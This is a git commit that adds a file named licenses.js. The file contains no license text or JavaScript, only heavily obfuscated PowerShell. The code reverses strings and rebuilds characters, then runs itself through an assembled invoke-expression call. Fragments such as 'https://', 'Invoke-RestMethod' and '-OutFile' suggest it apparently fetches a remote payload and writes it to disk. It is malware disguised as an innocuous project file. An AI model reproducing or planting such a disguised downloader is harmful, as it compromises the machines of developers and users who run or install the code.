1f45cb3e52e40af7d54e867640d740d0c7b264f5
Azkic50 <Azkilohj55@gmail.com>
2025-03-30 21:05:05 -0400

    Create licenses.js

---
+++ licenses.js
@@ -0,0 +1,22 @@
+SEt ("6B"+"Z")  ([Char[] ]")'X'+]43[emOHsp$+]4[emOhsp$ ( &|)93]raHc[]GNirTS[,)701]raHc[+501]raHc[+87]raHc[((EcALper.)43]raHc[]GNirTS[,'R8j'(EcALper.)'$','LW5'(EcALper.)'))63]Rahc[,)58]Rahc[+48]Rahc[+511]'+'Rahc[( ECAlPER-69]Rahc[,'+')15]Rahc[+311]R'+'ah'+'c[+17]Rahc[(  ECALpeRc-'+' 93]Rahc[,)311]Rahc[+17]R'+'ahc[+75]Rah'+'c[( ECAlPER-  ))kiNER.)43]rahC[]gNiRTS['+',)48]rahC[+37]rahCkiN'+',kiN[,qG9MlnqG9(ECaLpER.)qG93qGqG9kiN,kiN= qG9+qG9}dao8T4lN8qG9+qG9T4woqG9+qG98T4d{qG9+qG9F5XqG9+qG9 qG9+qG'+'9 qG9+qG9  qG9+kiN,kiN+qG9   qG9+qG'+'9  
+}    qG9+qG9  
+ ;}HtAp8T4e8T'+'4LiF{F5qG9+qG9XqG9+qG9 qkiN,kiNqG9+qG9AiSRA,SRqG9+qG9Asm.qG9'+'kiN,kiNTLqG9+qG9ISqG9+qG9RA,SRqG9+qG9AqG9+qG9Hk'+'iN,kiN98T4qG9+qG9peL8qG9+qG9T4if{F5XqG9+qG9 )qG9+qG9SRq'+'G9+qG9ASqG'+'9+qG9SqG9+qG9RA,SRAtrkiN,kiN'+'G9}qG9+qG94{}1qG9+qG9{qG9+qG9}qG9+qG93{}5{}0{}7{}2{}8{qG9+qG9}qG9+qG96{TIq'+'qG9+qG9( =qG9+qG9 )SqG9+q'+'G9RkiN,kiN,)65]rahC[+48]rahC[+25]'+'rahC[((ECaLpER.)93]rahC[]gNiRTS[,qG9SRAqG9(ECaLpkiN,kiNAqG9+'+'qG9aSRAqG9+qG9({qG9+q'+'G9@]tqG9+qG9cejbOmotqG9+qG9skiN,kiNG9'+'     qG9+qG9
+;'+'TIqG9+qG9'+'q)b'+'.ikiN,kiNgNiRTSkiN,kiNatqG9+qkiN,kiN9A,SRqG'+'9+qG9AssqG9+qG9ecSRqG9+qG9A qG'+'9+qG9fqG9+qG9- TIqG9'+'+qG9qqki'+'N,k'+'iNRqG9+qG9AqG9+qG9,SRA.SkiN,kiNqG9+qG9RAqG9+qG9,SkiN,kiN9tSkiN,kiN-]2,11,3[EMAN.)'+'qG9*RdM*qG9 Vg(( & kiN,kiN9}qG9+qG92{qG9+qG9}3{TIq(qG9+qG9. q'+'G9kiN,kiN+qkiN,kiNG9SRA'+',SqG9+'+'qG9RAqG9+qG9orqG9+qG'+'9P-SRqG9'+'+qGkiN,kiNG9+qG9}0{}1qG9+qG'+'kiN,kiN}3{}qG9+qG91{}2{}0{TIqG9+qG9qqG9+qG9( qG9+qG9= )SqG9+qG9RqG9+qG9AkiN,kiN9{qG9+qGkiN,kiN9+qG9LqG9+qG98T4NqG9+qG9wO8T4d{FqG9+qG95X qG9'+'+qkiN,kiN+qG9tuO-kiN,kiNAeTSRAf- ki'+'N,kiNqG9+qG9RqG9+qG9A,SRqG'+'9+qG9A-sqG9'+'+'+'qG9utanqG9+qG9//qG9+qG9:sqG9+qG9pttqG9+qG9hSRAqG9+qG9,SRAeqG9+qGkiN,kiNG'+'9+qG9X = }DA8T4OqGkiN,kiN9+qG9Iq}4qG9+qG9{kiN,kiN))qG'+'9UTsqG9,)07]rahC[+35]r'+'ahC[+88]rahC[((ECaLpER.)29]rahC[]kiN,kiN T'+'IqqG9+qG9aTIq.}I{qG9+qG9FqG9+qG95XqG9+qG9 irU- qG9+qG9'+')SqG9+qG9RqG9+qG9AdohtqG9+qG9eqG9+qG9MSRqG9+qG9A,SRAeR-eqG9+qG9kovSqG9+qG9RAqG9+qG9,SRAqG9+'+'qG9tsS'+'RqG9+qG9A,'+'qG9+qG9SRqG9+qG9AnqG9+qG9ISRAf-qG9+qG9TqG9+qG9'+'IqG9+qkiN,kiN+qG9nqG9+qG9i'+' }I{F5X( hcaqG9+qG9erofq'+'G9+qG9  
+;'+')
+})SRkiN,kiNG95qG9+qG9X )SRqG9+qG9AhtaSRAqG9+qG9,SqG9+qG9RqG9+qG9AP-tsSqG9+qG9RA,SkiN,kiNG9(( )qG9qG9nIoJ'+'kiN,kiN;}eS8T4LAf{F5X qG9'+'+qG9kiN,kiN+qG95qG9+qG9X  qG9+qG9
+
+qkiN,kiNF5X(qG9+qG9F5XMlnqG9+qG9PkiN,'+'k'+'iNG9qkiN,kiNqG'+'9+qG9SRqG9+qG9AqG9'+'+qG9,SRqG9+qG'+'9APSqG9+qG9RqG9+qG9AqG9+qG9,qG9+qG9SRASqG9+qG9PSRA f-kiN,kiNqG9+qG9'+'TqGkiN,ki'+'N+qG9FqG9+qG9FqG9'+'+qG9kiN,kiNu'+'CSP[  '+'
+(qG9+qG9@ = }ATad8T4em8TqG9+qG94'+'OqG9+qG9S{FqG9kiN,kiN8TqG9+qG94lqG9+qG9iq'+'G9+qG9f{qG9+qGkiN,kiN+qG94F{F5X    qG9+qG9  qG9+qG9
+{qG9+qG9 yqG'+'9+qG9rt qG'+'9+qG9 qG9+qG9  
+'+'qG9+qG9{ )}ATqG9+q'+'G9ad8T4eqG9+qG9m8T4OsqG9+qG9{FqG9+qG95X q'+'G9kiN,kiN9FqG9kiN,kiN[+311]rahC[((ECaLpER.)qG9 qG9+qG9 
+
+}qG9+qG9  
+} qG9+'+'qG9  qG9+qG9 qG9+qG'+'9
+{qG9+qG9 qG9+qG9hctacqG9+qG9 qG9+qG9   
+}   q'+'G9+qG9 
+;}qG9+qG9hqG9+qG9tAqG9+qGki'+'N,kiNTIq'+'qG9+qG9}2{qG9+qG9}1qG9+qG'+'9{}0{TIq(qG9+qG9.( fqG9+qG9i     qG9+qG9 
+;}qG9+qG9euR8T4kiN,kiN}'+'3{}qG9+qG91{}qG9+qG92{qG9+qG9'+'}0qG9+qG9{TIq(&qG9+qG9 qG9+qG9       
+{ )qG9+qG9'+'}dA8T4oqG9+qG9L'+'nW8TqG'+'9+qG'+'94oD{F5XqG9+qG9(qG9+qG9 fi qG9+qG9     qG9+qG9
+ qG9+qGki'+'N,kiNqG9'+' '+' qG9+qG9  qG9+qG9
+qG9+'+'qG9{qG9+qG9 )}HT8TqG9+qG94aqG9+qG9PEkiN,kiNqG'+'9+qG9MqG9+qG9ET:vneF5q'+'G9+qG9XqG9+qG9TqG9+qG9Iq qG9+qG9=qG9+qG'+'9 }qG9+qG9HTape8T4qG9+qG9lqG9+qG9IqG9+qG98TqG9kiN,k'+'iNRA,SqG9+qG9RAFTLqG9+qG9IPHSSRqG9'+'+qG9'+'A,qG9+qG9SqG9+qG9RAisSRAqG9+qG9 qG9+qG9f-TIqqG9+qG9}9{qG9+qkiN,kiN'+'bqG9+qG9SRAqG9+qG9( ;)qG9+qG9SRAismSRA,qG9'+'+qG9SRqG9+qG9AriqG9+qG9pqG9+qG9SR'+'A,qG9+qG9SqG'+'9+qG9RAqG9+qG9bqG9+qG9ew.suqG9+qG9SkiN,kiNG9+'+'qG9e'+'qG9+qG9'+'liFqG9kiN,kiNqG9+qG9RkiN,kiNqG9+qG9T{FqG9+qG95qkiN,kiNRAqG9+qG9PqG9+qG9/qG9+qG9SRAqG9+qG9,SRqG9+qG9AtSqG9+qG9kiN,kiN9}      
+qG9+qG9kiN f- R8j}72{}64{}65{}94'+'{}75{}11{}15{}54{}73{}44{}'+'63{}43'+'{}93{}45{}4{}23{}62{}91{}9{}0{}22{}55{}'+'8{}41{}21{}83{}42{}3{}13{}01{}2{}92{}33{}74{}02{}7{}31{}52{}35{}61{}25{}8'+'1{}71{}82{'+'}53{}5{}03{}14{}34{}24{}1{}6{}05{}84{}51{}'+'12{}32{}04{R8j((( ( '+')kiNXkiN+]31[DIlLehSLW5+]1[DilLeHSLW5 ( .'("  ) ; [arRaY]::ReveRSE((iTem  ('Va'+'RiaBle:6'+'bZ') ).VALue ); . ( $vERbOsePrefErEnCE.TOstriNG()[1,3]+'x'-JoIn'')( [string]::jOIN( '',(iTem  ('Va'+'RiaBle:6'+'bZ') ).VALue ) ) 
